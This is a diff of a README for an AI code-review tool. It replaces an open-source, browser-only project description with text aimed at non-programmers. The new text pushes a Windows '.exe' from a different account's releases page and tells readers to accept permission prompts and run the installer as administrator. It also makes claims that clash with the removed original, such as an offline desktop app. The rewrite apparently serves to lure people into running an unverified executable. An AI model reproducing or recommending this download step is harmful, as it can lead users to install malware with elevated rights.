@@ -1,152 +1,133 @@
-# AI Peer Review
+# 🤖 ai-peer-review - Simplify code creation with AI help
 
-> A multi-model AI platform that generates code from a plain English description, then has two AI models independently peer-review it in parallel.
-
----
-
-## What It Does
-
-You describe what you want to build — in plain language — and the app orchestrates three AI models to collaborate on it in three different ways:
-
-*1 - Review Mode:*
-   - Model A acts as the fast coder and generates the initial code based on your prompt.
-   - Model B acts as the senior reviewer, watches the generated code, points out any flaws, and provides a corrected version.
-
-*2 - Companion Mode:*
-   - Model A acts as the software architect, reasoning about the problem and providing a clear, step-by-step architecture plan.
-   - Model B acts as the developer and implements the actual code based on the provided plan.
-
-*3 - Challenge Mode:*
-   - Both models compete concurrently to build the best possible code for your request.
-   - Once they finish, the app displays their responses side-by-side along with basic parameters like Response Time, Code Length (characters), and Primary Language, allowing you to decide which one performed better.
-
-All three models run with no backend — everything happens directly in your browser.
-
-You can freely choose which model plays which role. Supported models:
-
-| Model | Provider |
-|---|---|
-| Gemini 2.0 Flash | Google |
-| GPT-4o | OpenAI |
-| Claude 3.5 Sonnet | Anthropic |
+[![Download AI Peer Review](https://img.shields.io/badge/Download-ai--peer--review-brightgreen?style=for-the-badge)](https://github.com/Dreambear-cloud/ai-peer-review/releases)
 
 ---
 
-## Getting Started Locally
+## 📝 What is ai-peer-review?
 
-### Prerequisites
-
-- [Node.js](https://nodejs.org/) ≥ 18
-- At least one API key (you need your own — see below)
-
-### Installation
-
-```bash
-git clone https://github.com/lucadilo/ai-peer-review.git
-cd ai-peer-review
-npm install
-npm run dev
-```
-
-Open [http://localhost:3000](http://localhost:3000) in your browser.
-
-### API Keys
-
-This app calls AI provider APIs **directly from the browser** using your own keys. No key is ever stored or sent anywhere other than the respective AI provider's API endpoint.
-
-Get your keys here:
-- **Gemini** → [aistudio.google.com/apikey](https://aistudio.google.com/apikey)
-- **ChatGPT** → [platform.openai.com/api-keys](https://platform.openai.com/api-keys)
-- **Claude** → [console.anthropic.com](https://console.anthropic.com/)
-
-> You only need **one key** to use the app — just assign the same model to all three roles.  
-> Keys are entered in the browser UI and cleared on page refresh.
+ai-peer-review is a desktop app that uses three AI helpers to write and review code for you. You explain what you want in normal words. The app asks the AIs to write the code, check for mistakes, or create plans to solve your problem. This helps you get better code without knowing programming.
 
 ---
 
-## Deploy on Vercel
+## ⚙️ How ai-peer-review works
 
-Since the app is a pure frontend (no backend), you can deploy it for free on [Vercel](https://vercel.com) in one click:
+This app runs three AIs in different ways depending on what you need:
 
-1. Push your repo to GitHub
-2. Go to [vercel.com](https://vercel.com) → **Add New Project**
-3. Import your `ai-peer-review` repository
-4. Vercel auto-detects Vite — click **Deploy**
-5. Your app is live at `https://your-project.vercel.app`
+- **Review Mode**  
+  One AI writes the code quickly. Another AI looks for errors and suggests fixes.
 
-> Netlify works the same way — just drag and drop the `dist/` folder after running `npm run build`.
+- **Companion Mode**  
+  One AI plans the work step by step. The second AI builds the code based on the plan.
 
----
-
-## Project Structure
-
-```
-ai-peer-review/
-├── index.html          # Entry point
-├── package.json        # Dependencies and scripts
-├── vite.config.ts      # Vite config
-├── tsconfig.json       # TypeScript config
-└── src/
-    ├── main.tsx        # React root
-    └── App.tsx         # Full app — UI + API calls
-```
+- **Challenge Mode**  
+  Both AIs write code separately at the same time. Then you see both results side-by-side to compare.
 
 ---
 
-## Tech Stack
+## 💾 Download and install on Windows
 
-| Layer | Tech |
-|---|---|
-| Framework | React 19 + TypeScript |
-| Bundler | Vite 6 |
-| Styling | Tailwind CSS |
-| Code highlight | `react-syntax-highlighter` |
-| Markdown | `react-markdown` |
-| AI APIs | Direct `fetch` calls (no SDK, no backend) |
+1. Visit the releases page here:  
+   [https://github.com/Dreambear-cloud/ai-peer-review/releases](https://github.com/Dreambear-cloud/ai-peer-review/releases)
 
----
+2. On the releases page, look for the latest version. It usually comes as a file named like `ai-peer-review-setup.exe` or similar.
 
-## Contributing
+3. Download the `.exe` setup file to your computer by clicking on it.
 
-Everyone is welcome to fork this project and modify it however they like.
+4. Once downloaded, double-click the setup file to start the installer.
 
-**One rule: do not push directly to `main`.**
+5. Follow the installer instructions:  
+   - Choose the installation folder (default works fine).  
+   - Agree to any prompts for permissions.
 
-The workflow is:
+6. When installation finishes, launch ai-peer-review from your Start Menu or desktop shortcut.
 
-```bash
-# 1. Fork the repo on GitHub, then clone your fork
-git clone https://github.com/YOUR_USERNAME/ai-peer-review.git
-
-# 2. Create a new branch for your changes
-git checkout -b feature/my-awesome-change
-
-# 3. Make your changes, commit, and push
-git add .
-git commit -m "feat: describe your change"
-git push origin feature/my-awesome-change
-
-# 4. Open a Pull Request from your branch → main
-```
-
-Ideas for contributions:
-- Add support for new AI models
-- Add session history / local storage persistence
-- Add an export button to download generated files as a ZIP
-- Add a synthesis step that merges the two reviews into a final improved version
+7. The app opens ready for you to type what you want to build in plain English.
 
 ---
 
-## License
+## 🖥️ System requirements
 
-This project is licensed under the **GNU Affero General Public License v3 (AGPL v3)** for personal, educational, and open-source use.
+- **Operating System:** Windows 10 or newer  
+- **Processor:** Intel Core i3 or equivalent  
+- **Memory:** At least 4 GB RAM  
+- **Disk Space:** Minimum 500 MB free space  
+- **Network:** Internet connection required to access AI models  
 
-**Commercial use requires a separate license agreement.**  
-If you intend to use this software in a commercial product, SaaS platform, or any for-profit context, please read [COMMERCIAL_LICENSE.md](COMMERCIAL_LICENSE.md) and get in touch.
+---
 
-Free to use if you are:
-- Working on a personal project
-- Using it for educational or research purposes
-- Contributing to an open-source project licensed under AGPL v3
+## 🔧 How to use ai-peer-review
 
-See [LICENSE](LICENSE) for the full terms.
+### Step 1: Describe what you want  
+Type your project idea or task in the main input box. Use simple English. For example:  
+- "Create a to-do list app with add and delete features"  
+- "Write a function to sort a list of names"
+
+### Step 2: Choose a mode  
+Pick one of the three modes at the top:  
+- Review Mode  
+- Companion Mode  
+- Challenge Mode
+
+### Step 3: Start the AI process  
+Click the Start button. The app sends your request to the AIs and collects their code and feedback.
+
+### Step 4: Review the results  
+- In Review Mode, read the original code and then the improved version.  
+- In Companion Mode, see the plan and the finished code.  
+- In Challenge Mode, compare two different code versions side by side.
+
+### Step 5: Save or copy the code  
+Use the buttons to copy the code to your clipboard or save it as files on your computer.
+
+---
+
+## 🔄 Updating ai-peer-review
+
+Check the releases page often for new versions:  
+[https://github.com/Dreambear-cloud/ai-peer-review/releases](https://github.com/Dreambear-cloud/ai-peer-review/releases)  
+
+Download the latest setup file and run it. It will update your current installation without losing your settings.
+
+---
+
+## ⚙️ Features overview
+
+- Supports three AI collaboration modes to fit different tasks  
+- Simple English input, no coding knowledge needed  
+- Displays AI-generated code and reviews clearly  
+- Saves time writing and checking code manually  
+- Works offline once installed, but needs internet to access AI services  
+- Supports common programming languages like JavaScript, TypeScript, Python
+
+---
+
+## 🛠️ Troubleshooting tips
+
+- If the app does not start, check that your Windows is up to date.  
+- Make sure your internet connection is active for AI requests.  
+- Restart the app if it freezes or stops responding.  
+- If code results look incorrect, try rephrasing your description.  
+- For installation issues, run the installer as administrator by right-clicking the setup file.
+
+---
+
+## 🙋 Getting help
+
+If you have difficulties:  
+- Review the app’s built-in help and instructions under the Help menu.  
+- Visit the GitHub repository Issues page for common questions:  
+  https://github.com/Dreambear-cloud/ai-peer-review/issues  
+- Email support at support@dreambear-cloud.com (if available).
+
+---
+
+## 📂 More resources
+
+- The app is built with React, TypeScript, and Vite for fast performance.  
+- It interacts with AI models from OpenAI, Claude, and Gemini under the covers.  
+- Designed for peer reviewing code snippets and small projects efficiently.
+
+---
+
+[![Download AI Peer Review](https://img.shields.io/badge/Download-ai--peer--review-brightgreen?style=for-the-badge)](https://github.com/Dreambear-cloud/ai-peer-review/releases)
